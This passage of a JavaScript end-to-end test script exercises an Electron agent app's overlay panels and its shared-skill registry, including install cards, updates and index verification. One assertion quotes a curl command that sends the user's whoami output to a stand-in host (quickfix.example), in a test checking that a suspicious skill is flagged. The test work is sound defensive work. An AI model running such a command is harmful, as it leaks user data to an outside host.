    // Park the injected cursor mid-screen, so the real mouse (someone using
    // the machine during the run) can't trip the hot edge or auto-hide.
    await hooks.eval(`(() => { const d = __leutheriaTest.display().bounds; __leutheriaTest.setCursor({ x: d.x + Math.round(d.width / 2), y: d.y + Math.round(d.height / 2) }); })()`);
    const main = await Page.attach("renderer/index.html");
    await main.size(WIDTHS[0], HEIGHT);
    await main.waitFor(`document.getElementById("status").dataset.state === "connected"`, 15000);
    await main.waitFor(`window.LX && LX.state.inventory`, 8000);
    return { hooks, main };
  }

  async function quit() {
    if (!electron) return;
    const child = electron;
    electron = null;
    const gone = new Promise((resolve) => child.once("exit", () => resolve(true)));
    child.kill();
    // The relaunch reuses the debugging ports, so the old one must really be
    // gone; Electron sometimes takes its time over SIGTERM.
    if (!(await Promise.race([gone, sleep(4000)]))) {
      child.kill("SIGKILL");
      await Promise.race([gone, sleep(3000)]);
    }
    await sleep(600);
  }

  const panelState = (hooks, id) => hooks.eval(`__leutheriaTest.panels().find((p) => p.id === ${JSON.stringify(id)}) || null`);
  const visible = (hooks, id) => `(__leutheriaTest.panels().find((p) => p.id === ${JSON.stringify(id)}) || {}).visible === true`;
  const openPage = async (id) => {
    const page = await Page.attach(`panel.html?id=${id}`);
    await page.send("Emulation.setDefaultBackgroundColorOverride", { color: backdrop });
    await page.waitFor(`document.body.classList.contains("ready")`, 8000);
    return page;
  };

  try {
    let { hooks, main } = await launch();
    if (theme === "light") await main.eval(`document.getElementById("theme-toggle").click()`);
    // Auto-hide off while panels are being moved around under the parked
    // cursor; it gets its own check with the hot edge below.
    await main.eval(
      `window.leutheria.setOverlaySettings({ panels: Object.fromEntries(["chat","skills","activity","permissions","timers","voice"].map((id) => [id, { autoHide: { mode: "never" } }])) })`
    );
    await sleep(300);
    const front = frontmostApp();
    // Focus is checked two ways: no panel window is ever the focused window,
    // and the frontmost app doesn't become this one. (The owner may switch
    // apps during a run, so "frontmost changed" alone isn't a failure; it is
    // one only if it changed to us.)
    const panelFocused = async () => {
      const focused = await hooks.eval(`__leutheriaTest.focused()`);
      return ["chat", "skills", "activity", "permissions", "timers", "voice", "other"].includes(focused) ? focused : null;
    };
    const stoleFront = () => {
      const now = frontmostApp();
      return /Electron|Leutheria/.test(now || "") && now !== front ? now : null;
    };

    // --- every panel, opened the way the agent opens them: a panel message
    const OPEN = [
      ["skills", "show me my skills", `document.querySelectorAll("#library-list .list-row").length >= 13`],
      ["activity", "show me what you've been doing", `document.querySelector("#activity-body .usage-row")`],
      ["permissions", "show my permissions", `document.querySelector("#permissions-body .trust-row")`],
      ["timers", "show me my timers", `document.querySelectorAll("#timers-body .timer").length === 3`],
      ["voice", "show me the voice panel", `document.querySelector(".vp-word").textContent.length > 0`],
      ["chat", "open the chat", `document.getElementById("chat")`],
    ];
    const pages = {};
    for (const [id, phrase, ready] of OPEN) {
      const replies = await main.eval(`document.querySelectorAll("#chat .msg.assistant").length`);
      await main.eval(typeCommand(phrase));
      const shown = await hooks.waitFor(visible(hooks, id), 8000);
      check(`${T} "${phrase}" opens the ${id} panel`, shown);
      if (!shown) continue;
      pages[id] = await openPage(id);
      check(`${T} the ${id} panel draws its view`, await pages[id].waitFor(ready, 8000));
      check(
        `${T} ...and the agent's reply still reaches the transcript`,
        await main.waitFor(`document.querySelectorAll("#chat .msg.assistant").length > ${replies}`, 6000)
      );
      const state = await panelState(hooks, id);
      check(`${T} the ${id} panel opened without taking focus`, !state.focused && !(await panelFocused()));
      await pages[id].shot(file(`${id}-${state.orientation}`));
    }
    check(`${T} opening panels never made this app frontmost`, !stoleFront(), `${front} -> ${frontmostApp()}`);
    await main.eval(`document.getElementById("chat-scroll").scrollTop = 1e6`);
    await main.shot(file("main-after-panel-commands"));

    // --- query, unknown panel, hide one, hide all
    await main.eval(typeCommand("show me my skills about file"));
    check(
      `${T} a query pre-fills the skills filter`,
      await pages.skills.waitFor(`document.querySelector("#panel-tools .search input").value === "file" && document.querySelectorAll("#library-list .list-row").length < 8`)
    );
    await pages.skills.shot(file("skills-query"));
    await pages.skills.eval(clickText("#library-list .list-row-name", "list_dir"));
    await pages.skills.waitFor(`document.querySelector("#library-detail .switch")`);
    await pages.skills.shot(file("skills-detail"));
    check(`${T} the skills detail is the short one`, await pages.skills.eval(`!document.querySelector("#library-detail .params, #library-detail .danger-zone") && /Open in the Library/.test(document.getElementById("library-detail").textContent)`));
    await pages.skills.eval(`document.querySelector("#library-detail .switch").click()`);
    check(
      `${T} a toggle in the panel round-trips and reaches the main window`,
      (await pages.skills.waitFor(`document.querySelector("#library-detail .switch").getAttribute("aria-checked") === "false"`)) &&
        (await main.waitFor(`LX.state.inventory.tools.find((t) => t.name === "list_dir").enabled === false`))
    );
    await pages.skills.eval(clickText("#library-detail .link-button", "Reset"));
    await pages.skills.waitFor(`document.querySelector("#library-detail .switch").getAttribute("aria-checked") === "true"`);

    const windowsBefore = await hooks.eval(`__leutheriaTest.panels().length`);
    await main.eval(typeCommand("show me the bogus panel"));
    await main.waitFor(`[...document.querySelectorAll("#chat .msg-body")].some((n) => /your bogus/.test(n.textContent))`, 6000);
    check(`${T} an unknown panel id is ignored (no window), and logged`, (await hooks.eval(`__leutheriaTest.panels().length`)) === windowsBefore);
    await main.eval(clickNav(NAV.logs));
    check(`${T} ...the log says so`, await main.waitFor(`/unknown panel "bogus"/.test(document.getElementById("logs").textContent)`));
    await main.eval(clickNav(NAV.assistant));

    // --- permissions: revoke works from the panel
    const trustRows = await pages.permissions.eval(`document.querySelectorAll("#permissions-body .trust-row").length`);
    await pages.permissions.eval(clickText("#permissions-body .trust-row button", "Revoke"));
    check(
      `${T} Revoke works in the permissions panel, with a toast`,
      (await pages.permissions.waitFor(`document.querySelectorAll("#permissions-body .trust-row").length === ${trustRows - 1}`)) &&
        (await pages.permissions.waitFor(`document.querySelector("#toasts .toast")`))
    );
    await pages.permissions.shot(file("permissions-revoked"));

    // --- timers: cancel goes through the agent
    await pages.timers.eval(`document.querySelector("#timers-body .timer .btn").click()`);
    check(`${T} cancelling a timer asks the agent and the list follows`, await pages.timers.waitFor(`document.querySelectorAll("#timers-body .timer").length === 2`, 9000));
    await pages.timers.shot(file("timers-after-cancel"));

    // --- chat: the same conversation in both windows
    const panelChat = pages.chat;
    check(`${T} the chat panel starts with the session so far`, await panelChat.eval(`/show me my skills/.test(document.getElementById("chat").textContent)`));
    await panelChat.eval(typeCommand("typed in the panel"));
    check(
      `${T} a command typed in the panel shows in both, with the reply`,
      (await main.waitFor(`/Mock reply to: typed in the panel/.test(document.getElementById("chat").textContent)`)) &&
        (await panelChat.waitFor(`/Mock reply to: typed in the panel/.test(document.getElementById("chat").textContent)`))
    );
    await main.eval(typeCommand("typed in the main window"));
    check(`${T} ...and one typed in the main window shows in the panel`, await panelChat.waitFor(`/Mock reply to: typed in the main window/.test(document.getElementById("chat").textContent)`));
    await panelChat.eval(typeCommand("confirm this"));
    check(`${T} a confirmation card appears in the panel and the main window`, (await panelChat.waitFor(`document.querySelector("#chat .prompt-card.confirm .prompt-actions")`)) && (await main.waitFor(`[...document.querySelectorAll("#chat .prompt-card.confirm")].pop().querySelector(".prompt-actions")`)));
    await panelChat.eval(`document.getElementById("chat-scroll").scrollTop = 1e6`);
    await panelChat.shot(file("chat-confirm"));
    await panelChat.eval(clickText("#chat .prompt-card.confirm button", "Approve"));
    check(`${T} approving in the panel settles the main window's card`, await main.waitFor(`/in a panel/.test([...document.querySelectorAll("#chat .prompt-resolved")].pop()?.textContent || "")`));
    await panelChat.waitFor(`/Ran it/.test(document.getElementById("chat").textContent)`);
    const doubled = await panelChat.eval(`[...document.querySelectorAll("#chat .msg.user")].filter((n) => /typed in the panel/.test(n.textContent)).length`);
    check(`${T} nothing is shown twice in the panel`, doubled === 1, `${doubled} copies`);
    await panelChat.shot(file("chat-synced"));
    check(`${T} the chat panel never took focus on its own`, !(await panelFocused()));

    // --- every panel in its other orientation (horizontal must be a real
    // layout, not a squashed vertical one)
    for (const [id] of OPEN) {
      const was = await pages[id].eval(`document.body.dataset.orientation`);
      const next = was === "vertical" ? "horizontal" : "vertical";
      await pages[id].eval(`document.querySelector('[data-ctl="orientation"]').click()`);
      const shaped =
        next === "horizontal"
          ? `document.body.dataset.orientation === "horizontal" && window.innerWidth > window.innerHeight * 2`
          : `document.body.dataset.orientation === "vertical" && window.innerHeight > window.innerWidth`;
      check(`${T} ${id} turns ${next}`, await pages[id].waitFor(shaped, 5000));
      await pages[id].shot(file(`${id}-${next}`));
    }
    check(`${T} horizontal chat runs left to right`, await panelChat.eval(`getComputedStyle(document.getElementById("chat")).flexDirection === "row"`));
    check(`${T} horizontal skills groups are columns`, await pages.skills.eval(`getComputedStyle(document.querySelector(".library-rows")).display === "flex"`));
    for (const id of ["chat", "skills", "activity", "permissions"]) await pages[id].eval(`document.querySelector('[data-ctl="orientation"]').click()`);
    await sleep(500);

    // --- dock picker, move (undocks), resize, opacity, pin, on the skills panel
    const display = await hooks.eval(`__leutheriaTest.display()`);
    const area = display.workArea;
    await pages.skills.eval(`document.querySelector('[data-ctl="dock"]').click()`);
    await pages.skills.shot(file("skills-dock-menu"));
    await pages.skills.eval(`document.querySelector('.panel-menu-item[data-dock="right"]').click()`);
    await sleep(500);
    let s = await panelState(hooks, "skills");
    check(`${T} docking right puts it on the right edge, full height`, s.dock === "right" && s.bounds.x + s.bounds.width === area.x + area.width && s.bounds.height === area.height, JSON.stringify(s.bounds));
    await pages.skills.eval(`(async () => { await window.leutheria.panelOp("move-start"); await window.leutheria.panelOp("move", { dx: -500, dy: 120 }); await window.leutheria.panelOp("move-end"); })()`);
    await sleep(400);
    s = await panelState(hooks, "skills");
    check(`${T} dragging the heading undocks it where it's dropped`, s.dock === "free" && Math.abs(s.bounds.x - (area.x + area.width - 400 - 500)) <= 2, JSON.stringify(s.bounds));
    const before = s.bounds;
    await pages.skills.eval(`(async () => { await window.leutheria.panelOp("resize-start", { edge: "se" }); await window.leutheria.panelOp("resize", { dx: 80, dy: -200 }); await window.leutheria.panelOp("resize-end"); })()`);
    await sleep(400);
    s = await panelState(hooks, "skills");
    check(`${T} resizing from a corner`, s.bounds.width === before.width + 80 && s.bounds.height === Math.max(260, before.height - 200) && s.bounds.x === before.x, JSON.stringify(s.bounds));
    check(`${T} a free panel can be resized from every edge`, (await pages.skills.eval(`document.querySelectorAll(".panel-resizer").length`)) === 8);
    const opacityResult = await pages.skills.eval(`window.leutheria.panelOp("opacity", 0.7).then((r) => r.ok || r.error)`);
    if (opacityResult !== true) console.log(`     opacity op: ${opacityResult}`);
    await sleep(300);
    s = await panelState(hooks, "skills");
    check(`${T} opacity applies to the window`, Math.abs(s.opacity - 0.7) < 0.01, String(s.opacity));
    await pages.skills.eval(`document.querySelector('[data-ctl="pin"]').click()`);
    await pages.skills.waitFor(`document.querySelector('[data-ctl="pin"]').getAttribute("aria-pressed") === "true"`);
    await pages.skills.shot(file("skills-free-pinned"));
    const saved = JSON.parse(fs.readFileSync(layoutFile, "utf8")).panels.skills;
    check(`${T} the layout is written to overlay-layout.json`, saved.dock === "free" && saved.pinned === true && saved.opacity === 0.7 && saved.x === s.bounds.x, JSON.stringify(saved));
    const timersHorizontal = JSON.parse(fs.readFileSync(layoutFile, "utf8")).panels.timers.orientation;

    // --- hide one, hide all
    await main.eval(typeCommand("hide the timers"));
    check(`${T} "hide the timers" hides that panel`, await hooks.waitFor(`!(${visible(hooks, "timers")})`, 6000));
    await main.eval(typeCommand("hide panels"));
    check(`${T} hide with panel "all" hides every open panel`, await hooks.waitFor(`__leutheriaTest.panels().every((p) => !p.visible)`, 6000));
    await main.eval(typeCommand("toggle the voice"));
    check(`${T} toggle shows a hidden panel`, await hooks.waitFor(visible(hooks, "voice"), 6000));
    await hooks.eval(`__leutheriaTest.hideAll()`);

    // --- the hot edge (cursor injected through the test hook)
    await main.eval(`window.leutheria.setOverlaySettings({ panels: { chat: { autoHide: { mode: "leave" } } } })`);
    const b = display.bounds;
    const midY = b.y + Math.round(b.height / 2);
    await hooks.eval(`__leutheriaTest.setMouseDown(true)`);
    await hooks.eval(`__leutheriaTest.setCursor({ x: ${b.x + b.width - 1}, y: ${midY} })`);
    await sleep(900);
    check(`${T} hot edge: nothing while a mouse button is held`, !(await hooks.eval(visible(hooks, "chat"))));
    await hooks.eval(`__leutheriaTest.setCursor({ x: ${b.x + 300}, y: ${midY} })`);
    await sleep(200);
    await hooks.eval(`__leutheriaTest.setMouseDown(false)`);
    await hooks.eval(`__leutheriaTest.setCursor({ x: ${b.x + b.width - 1}, y: ${midY} })`);
    await sleep(150);
    check(`${T} hot edge: not before the dwell`, !(await hooks.eval(visible(hooks, "chat"))));
    check(`${T} hot edge: resting on the right edge opens the chat panel`, await hooks.waitFor(visible(hooks, "chat"), 3000));
    s = await panelState(hooks, "chat");
    check(`${T} ...docked on that edge, without taking focus`, s.dock === "right" && !s.focused && !(await panelFocused()));
    check(`${T} ...and without making this app frontmost`, !stoleFront());
    await pages.chat.shot(file("hot-edge-chat"));
    // Auto-hide "leave": into the panel, then away.
    await hooks.eval(`__leutheriaTest.setCursor({ x: ${s.bounds.x + 100}, y: ${s.bounds.y + 100} })`);
    await sleep(300);
    await hooks.eval(`__leutheriaTest.setCursor({ x: ${b.x + 200}, y: ${midY} })`);
    await sleep(300);
    check(`${T} auto-hide waits out a brief exit`, await hooks.eval(visible(hooks, "chat")));
    check(`${T} auto-hide: it hides once the cursor has left`, await hooks.waitFor(`!(${visible(hooks, "chat")})`, 3000));
    // Another edge, another panel, from the Overlay view.
    await main.eval(clickNav(NAV.overlay));
    await main.waitFor(`document.querySelector('[data-focus="hot-edge:left"]')`);
    await main.eval(`document.querySelector('[data-focus="hot-edge:left"]').click()`);
    await main.waitFor(`document.querySelector('[data-focus="hot-edge:left"]').getAttribute("aria-pressed") === "true"`);
    await main.eval(`(() => { const s = document.querySelector('[data-key="hot-panel"] select'); s.value = "timers"; s.dispatchEvent(new Event("change")); })()`);
    await sleep(400);
    await hooks.eval(`__leutheriaTest.setCursor({ x: ${b.x}, y: ${midY} })`);
    check(`${T} hot edge follows the settings (left edge, timers)`, await hooks.waitFor(visible(hooks, "timers"), 3000));
    check(`${T} ...docked left for this showing`, (await panelState(hooks, "timers")).dock === "left");
    await pages.timers.shot(file("hot-edge-left-timers"));
    await hooks.eval(`__leutheriaTest.setCursor({ x: ${b.x + 600}, y: ${midY} })`);
    await hooks.eval(`__leutheriaTest.hideAll()`);

    // --- alerts anchor: the overlay window and the toasts
    await main.eval(`window.leutheria.setOverlaySettings({ alerts: { anchor: "bottom-right", toastAnchor: "top-right" } })`);
    await hooks.eval(`__leutheriaTest.positionOverlay()`);
    const ov = await hooks.eval(`__leutheriaTest.overlayBounds()`);
    check(`${T} the overlay goes to the alerts anchor (bottom right)`, ov && ov.x + ov.width === area.x + area.width - 12 && ov.y + ov.height === area.y + area.height - 12, JSON.stringify(ov));
    const overlay = await Page.attach("overlay/overlay.html");
    check(`${T} ...and flips its stage for a bottom anchor`, await overlay.waitFor(`document.body.dataset.anchor === "bottom-right" && getComputedStyle(document.querySelector(".stage")).flexDirection === "column-reverse"`));
    await main.eval(`LX.toast("Toast at the top right")`);
    check(
      `${T} toasts follow the toast anchor`,
      await main.waitFor(`(() => { const r = document.querySelector("#toasts .toast")?.getBoundingClientRect(); return r && r.top < 140 && r.right > window.innerWidth - 60; })()`)
    );
    await main.shot(file("toast-top-right"));
    await main.eval(`window.leutheria.setOverlaySettings({ alerts: { anchor: "top-center", toastAnchor: "bottom-left" } })`);

    // --- appearance: accent, refused accent, density -- in every window
    await main.eval(clickNav(NAV.overlay));
    await main.eval(clickText("#overlay-body .choice", "Blue"));
    const expected = await main.eval(`window.leutheria.checkAccent("#3b82f6").then((r) => r.vars["${theme}"]["--violet-lo"])`);
    const lo = (page) => page.eval(`getComputedStyle(document.documentElement).getPropertyValue("--violet-lo").trim()`);
    await main.waitFor(`getComputedStyle(document.documentElement).getPropertyValue("--violet-lo").trim() === "${expected}"`);
    await hooks.eval(`__leutheriaTest.show("voice")`);
    const voicePage = pages.voice;
    await voicePage.waitFor(`getComputedStyle(document.documentElement).getPropertyValue("--violet-lo").trim() === "${expected}"`);
    const los = [await lo(main), await lo(overlay), await lo(voicePage)];
    check(`${T} an accent applies in the main window, the overlay and the panels`, los.every((value) => value === expected), los.join(" "));
    await main.eval(`document.querySelector('[data-key="accent"]').scrollIntoView({ block: "center" })`);
    await main.shot(file("accent-blue-settings"));
    await voicePage.shot(file("accent-blue-voice-panel"));
    await main.eval(`(() => { const i = document.querySelector('[data-key="accent"] .hex'); i.value = "#ffb224"; i.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter" })); })()`);
    check(
      `${T} an accent that reads as a state colour is refused, with the reason`,
      (await main.waitFor(`/^That colour reads as amber/.test(document.querySelector('[data-key="accent"] .field-error')?.textContent || "")`)) &&
        (await lo(main)) === expected
    );
    await main.shot(file("accent-refused"));
    await main.eval(clickText("#overlay-body .segmented button", "Compact"));
    check(`${T} density applies in every window`, (await main.waitFor(`document.documentElement.dataset.density === "compact"`)) && (await voicePage.waitFor(`document.documentElement.dataset.density === "compact"`)) && (await overlay.waitFor(`document.documentElement.dataset.density === "compact"`)));
    await main.eval(clickNav(NAV.library));
    await main.shot(file("compact-library"));
    await main.eval(clickNav(NAV.overlay));
    await main.eval(clickText("#overlay-body .segmented button", "Comfortable"));
    await main.eval(clickText("#overlay-body .choice", "Violet"));
    await main.waitFor(`!document.getElementById("appearance-overrides").textContent`);

    // --- restart: the layout comes back
    await quit();
    ({ hooks, main } = await launch());
    check(`${T} after a restart the pinned panel comes back`, await hooks.waitFor(visible(hooks, "skills"), 6000));
    s = await panelState(hooks, "skills");
    check(`${T} ...where it was, at its opacity`, s.dock === "free" && s.bounds.x === saved.x && s.bounds.y === saved.y && Math.abs(s.opacity - 0.7) < 0.01, JSON.stringify(s));
    check(`${T} ...and other panels keep their layout`, (await hooks.eval(`__leutheriaTest.settings().panels.timers.orientation`)) === timersHorizontal);
    const skillsAgain = await openPage("skills");
    await skillsAgain.shot(file("after-restart-skills"));
    await main.eval(clickNav(NAV.overlay));
    await main.waitFor(`document.querySelector('#overlay-body .panel-row[data-panel="skills"]')`);
    await main.eval(`document.querySelector('#overlay-body .panel-row[data-panel="skills"]').scrollIntoView({ block: "center" })`);
    await main.shot(file("overlay-view-panels"));
    await main.eval(clickText('#overlay-body .panel-row[data-panel="skills"] button', "Reset"));
    check(`${T} Reset puts a panel's layout back`, await hooks.waitFor(`__leutheriaTest.settings().panels.skills.dock === "left" && !__leutheriaTest.settings().panels.skills.pinned`, 4000));

    // --- a corrupt layout file: defaults, the file kept aside, no crash
    await quit();
    fs.writeFileSync(layoutFile, "{ this is not json");
    ({ hooks, main } = await launch());
    check(`${T} a corrupt layout file starts on defaults`, (await hooks.eval(`__leutheriaTest.settings().panels.skills.dock`)) === "left" && (await main.eval(`document.getElementById("status").dataset.state`)) === "connected");
    check(`${T} ...and is moved aside, not lost`, fs.existsSync(`${layoutFile}.corrupt`));
    await quit();
    fs.writeFileSync(layoutFile, JSON.stringify({ panels: { chat: { dock: "sideways", opacity: 5, vertical: { w: 20, h: 900 } }, timers: { dock: "bottom" } }, hotEdge: { dwellMs: "soon" } }));
    ({ hooks, main } = await launch());
    const loaded = await hooks.eval(`__leutheriaTest.settings()`);
    check(
      `${T} bad fields fall back one by one, good ones are kept`,
      loaded.panels.chat.dock === "right" && loaded.panels.chat.opacity === null && loaded.panels.chat.vertical.w === 400 && loaded.panels.chat.vertical.h === 900 && loaded.panels.timers.dock === "bottom" && loaded.hotEdge.dwellMs === 350,
      JSON.stringify(loaded.panels.chat)
    );
    await main.eval(clickNav(NAV.logs));
    check(`${T} ...and each one is logged`, await main.waitFor(`/panels.chat.dock: "sideways"/.test(document.getElementById("logs").textContent)`));
  } finally {
    await quit();
    mock.kill();
    await sleep(500);
  }
}

// The reduced pass for a real agent: real catalog, real control messages,
// nothing that runs a tool.
// --- the shared-skill registry: Discover, install card, share ------------------
// Its own mock and Electron, with LEUTHERIA_TEST_HOOKS=1: main.js then records
// the GitHub page a share would open (and what it would copy) instead of
// opening a browser or touching the clipboard, and the script reads that
// record through the main process's inspector.

async function runShared(theme) {
  const dir = path.join(OUT, theme, "shared");
  fs.mkdirSync(dir, { recursive: true });
  const file = (name) => path.join(dir, `${name}.png`);
  const stateDir = path.join(dir, "_state");
  fs.rmSync(stateDir, { recursive: true, force: true });
  const token = generateToken();
  const T = `[${theme}] shared:`;
  const backdrop = theme === "dark" ? { r: 34, g: 36, b: 44, a: 1 } : { r: 214, g: 216, b: 222, a: 1 };

  const mock = spawn(process.execPath, [path.join(__dirname, "mock-agent.js")], {
    env: { ...childEnv(token), MOCK_PORT: String(MOCK_PORT), MOCK_AUTOSTART: "0" },
    stdio: "ignore",
  });
  const env = {
    ...childEnv(token),
    LEUTHERIA_AGENT_URL: `ws://127.0.0.1:${MOCK_PORT}`,
    LEUTHERIA_NO_SPAWN: "1",
    LEUTHERIA_CAPTURE_DIR: stateDir,
    LEUTHERIA_CAPTURE_THEME: theme,
    LEUTHERIA_TEST_HOOKS: "1",
  };
  delete env.ELECTRON_RUN_AS_NODE;
  const electron = spawn(require("electron"), [".", `--remote-debugging-port=${DEBUG_PORT}`, `--inspect=${INSPECT_PORT}`], {
    cwd: APP_DIR,
    env,
    stdio: "ignore",
  });

  const rows = `[...document.querySelectorAll("#library-list .list-row")]`;
  const rowNames = (group) => `[...document.querySelectorAll("#library-group-${group} .list-row")].map((n) => n.dataset.name)`;
  const pick = (name) => clickText("#library-list .list-row-name", name);
  const card = `document.querySelector("#library-detail .install-card")`;
  const noOverflow = `document.documentElement.scrollWidth <= window.innerWidth && document.querySelector(".main").scrollWidth <= document.querySelector(".main").clientWidth`;

  try {
    const hooks = await Page.attach(null, 20000, INSPECT_PORT);
    await hooks.waitFor(`globalThis.__leutheriaTest`, 15000);
    // Park the injected cursor mid-screen so the hot edge stays out of it.
    await hooks.eval(`(() => { const d = __leutheriaTest.display().bounds; __leutheriaTest.setCursor({ x: d.x + Math.round(d.width / 2), y: d.y + Math.round(d.height / 2) }); })()`);
    const main = await Page.attach("renderer/index.html");
    await main.size(WIDTHS[0], HEIGHT);
    check(`${T} agent connects`, await main.waitFor(`document.getElementById("status").dataset.state === "connected"`, 15000));
    await main.waitFor(`window.LX && LX.state.inventory`, 8000);
    if (theme === "light") await main.eval(`document.getElementById("theme-toggle").click()`);
    const command = async (text) => {
      await main.eval(`window.leutheria.sendCommand(${JSON.stringify(text)})`);
      await sleep(400);
    };
    const refresh = async () => {
      await main.eval(`document.querySelector(".shared-refresh").click()`);
      await sleep(700);
    };

    // --- the Library's imported skills, before Shared is opened
    await main.eval(clickNav(NAV.library));
    check(
      `${T} imported skills are tagged in the full list (withdrawn, update, shared)`,
      await main.waitFor(
        `(() => { const tag = (n) => document.querySelector('#library-list .list-row[data-name="' + n + '"] .badge')?.textContent; return tag("convert_heic_batch") === "withdrawn" && tag("tidy_desktop") === "update" && tag("daily_standup_notes") === "shared"; })()`
      )
    );
    await main.eval(pick("daily_standup_notes"));
    check(`${T} an imported skill's detail says where it came from`, await main.waitFor(`/From the registry/.test(document.getElementById("library-detail").textContent) && /anurag-k/.test(document.getElementById("library-detail").textContent)`));
    await main.shot(file("library-imported-detail"));

    // --- Discover / Installed
    await main.eval(`document.querySelector('.segmented button[data-kind="shared"]').click()`);
    check(
      `${T} Shared lists Installed and Discover, a withdrawn version hidden from Discover`,
      await main.waitFor(
        `${rowNames("shared-installed")}.join() === "convert_heic_batch,daily_standup_notes,tidy_desktop" && ${rowNames("shared-discover")}.length === 4 && !${rowNames("shared-discover")}.includes("convert_heic_batch")`
      )
    );
    await main.eval(`LX.library.reveal("shared:")`); // nothing selected: the overview
    check(`${T} the overview reads the index as verified, 3 of 20 installed`, await main.waitFor(`document.querySelector('.shared-index-state[data-state="verified"]') && /3 \\/ 20/.test(document.getElementById("library-detail").textContent)`));
    check(`${T} rows mark run_command and risk`, await main.eval(`Boolean(document.querySelector('.list-row[data-name="clean_system_caches"] .shared-cmd') && document.querySelector('.list-row[data-name="clean_system_caches"] .badge-danger')) && !document.querySelector('.list-row[data-name="rename_screenshots"] .shared-cmd')`));
    await main.shot(file("shared-overview"));

    // the malicious-looking one: every step, in full, flagged
    await main.eval(pick("clean_system_caches"));
    check(`${T} the install card shows every step`, await main.waitFor(`${card} && ${card}.querySelectorAll(".install-steps .step").length === 4`));
    check(
      `${T} run_command steps are flagged, arguments untruncated`,
      await main.eval(
        `${card}.querySelectorAll(".step-command").length === 3 && /curl -s https:\\/\\/quickfix\\.example\\/stats\\?u=\\$\\(whoami\\)/.test(${card}.textContent) && /Runs shell commands/i.test(${card}.querySelector(".shared-cmd-warning").textContent)`
      )
    );
    check(
      `${T} author, review verdict, risk and flags are on the card and detail`,
      await main.eval(`/quickfix-dev/.test(${card}.textContent) && /Human reviewed/.test(document.getElementById("library-detail").textContent) && ${card}.querySelector(".shared-high-risk") && document.querySelectorAll(".shared-flags li").length === 3`)
    );
    check(`${T} the model's description is the local one, the author's is marked as never sent`, await main.eval(`/^Shared skill by quickfix-dev/.test(${card}.querySelector(".shared-model-desc").textContent) && /Never sent to the model/.test(${card}.textContent)`));
    await main.shot(file("shared-install-flagged"));
    await main.eval(`document.getElementById("library-detail").scrollTop = 1e6`);
    await main.shot(file("shared-install-flagged-bottom"));
    await sleep(500);
    check(`${T} selecting and reading the card installs nothing`, await main.eval(`!LX.state.inventory.skills.some((s) => s.name === "clean_system_caches")`));

    await main.eval(pick("git_morning_sync"));
    await main.waitFor(`${card} && ${card}.querySelectorAll(".install-steps .step").length === 3`);
    await main.shot(file("shared-install-cmd"));

    // install, by the card's button
    await main.eval(pick("rename_screenshots"));
    await main.waitFor(`${card} && ${card}.querySelector(".btn-hot") && !${card}.querySelector(".btn-hot").disabled`);
    await main.eval(`${card}.querySelector(".btn-hot").click()`);
    check(
      `${T} Install installs, the card settles, the row moves to Installed`,
      (await main.waitFor(`${card} && ${card}.classList.contains("resolved") && /Installed v2/.test(${card}.textContent)`)) &&
        (await main.waitFor(`LX.state.inventory.skills.some((s) => s.name === "rename_screenshots" && s.origin === "imported")`)) &&
        (await main.waitFor(`${rowNames("shared-installed")}.includes("rename_screenshots")`))
    );
    await main.shot(file("shared-installed"));

    // update: the new version's steps, marked against the installed ones
    await main.eval(pick("tidy_desktop"));
    check(
      `${T} an update is a new approval, with the changed steps marked`,
      await main.waitFor(`${card} && /Update to v2/.test(${card}.textContent) && ${card}.querySelectorAll(".install-steps .badge-accent").length === 1 && /Version 1 keeps working/.test(${card}.textContent)`)
    );
    await main.shot(file("shared-update"));

    await main.eval(pick("convert_heic_batch"));
    check(`${T} a withdrawn skill says so and offers Delete, no install card`, await main.waitFor(`document.querySelector("#library-detail .shared-withdrawn .btn-danger") && !${card}`));
    await main.shot(file("shared-withdrawn"));

    await main.eval(setInput(".search input", "mira"));
    check(`${T} search matches the author`, await main.waitFor(`${rows}.map((n) => n.dataset.name).join() === "rename_screenshots,tidy_desktop"`));
    await main.shot(file("shared-search"));
    await main.eval(setInput(".search input", ""));
    await main.eval(`document.querySelector('.library-filters [data-filter="updates"]').click()`);
    check(`${T} the Updates filter`, await main.waitFor(`${rows}.map((n) => n.dataset.name).join() === "tidy_desktop"`));
    await main.eval(`document.querySelector('.library-filters [data-filter="updates"]').click()`);

    // at the cap: Install is refused before it's sent
    await command("registry full");
    await refresh();
    await main.eval(pick("git_morning_sync"));
    check(`${T} at the cap Install is disabled and says why`, await main.waitFor(`${card} && ${card}.querySelector(".btn-hot").disabled && /At the limit/i.test(${card}.textContent)`));
    await main.shot(file("shared-cap"));

    // index states
    for (const [word, code, security] of [
      ["tampered", "verification_failed", true],
      ["nokey", "no_signing_key", true],
      ["offline", "unavailable", false],
    ]) {
      await command(`registry ${word}`);
      await refresh();
      await main.eval(`LX.library.reveal("shared:")`); // nothing selected: the overview
      const ok =
        (await main.waitFor(`document.querySelector('#library-list .shared-index[data-index="${code}"]')`)) &&
        (await main.eval(
          `${security} === Boolean(document.querySelector("#library-list .shared-index-refused")) && !document.getElementById("library-group-shared-discover") && ${rowNames("shared-installed")}.length === 4`
        ));
      check(`${T} index ${code}: ${security ? "a security state (red, alert)" : "a neutral notice"}; nothing listed to install, installed kept`, ok);
      await main.shot(file(`shared-index-${code}`));
    }
    // Unreachable, with a verified index from before: shown, marked stale, not refused.
    await command("registry stale");
    await refresh();
    check(
      `${T} a stale index is listed with a neutral notice, not refused`,
      (await main.waitFor(`document.querySelector('#library-list .shared-index[data-index="stale"]')`)) &&
        (await main.eval(`!document.querySelector(".shared-index-refused") && Boolean(document.getElementById("library-group-shared-discover"))`))
    );
    await command("registry ok");
    await refresh();

    // --- share a learned skill
    await main.eval(`document.querySelector('.segmented button[data-kind="all"]').click()`);
    await main.eval(pick("archive_downloads"));
    await main.eval(clickText("#library-detail button", "Preview share"));
    check(
      `${T} share preview: target path, what changed, flagged constants, the file`,
      await main.waitFor(
        `document.querySelector(".share-preview") && /skills\\/archive_downloads\\/[0-9a-f]{64}\\.json/.test(document.querySelector(".share-path").textContent) && document.querySelectorAll(".share-changes li").length >= 2 && document.querySelectorAll(".share-flagged li").length === 1 && /"steps"/.test(document.querySelector(".share-json").textContent)`
      )
    );
    await main.eval(`document.querySelector(".share-preview").scrollIntoView()`);
    await main.shot(file("share-preview"));
    await main.eval(clickText("#library-detail button", "Open on GitHub"));
    const opened = await main.waitFor(`document.querySelector(".share-done")`);
    const record = await hooks.eval(`__leutheriaTest.shared()`);
    const last = record[record.length - 1] || {};
